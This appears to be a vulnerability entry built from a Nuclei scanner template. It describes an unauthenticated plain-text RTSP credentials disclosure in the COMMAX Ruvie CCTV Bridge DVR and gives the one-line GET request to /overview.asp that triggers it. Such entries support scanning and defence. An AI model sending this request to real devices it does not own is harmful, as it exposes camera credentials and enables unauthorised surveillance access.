# Vulnerability: COMMAX Smart Home Ruvie CCTV Bridge DVR - RTSP Credentials Disclosure
**Classification:** COMMAX
**Source:** Nuclei Template (`commax-credentials-disclosure.yaml`)

## Description
The COMMAX CCTV Bridge for the DVR service allows an unauthenticated attacker to disclose real time streaming protocol (RTSP) credentials in plain-text.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/overview.asp
```

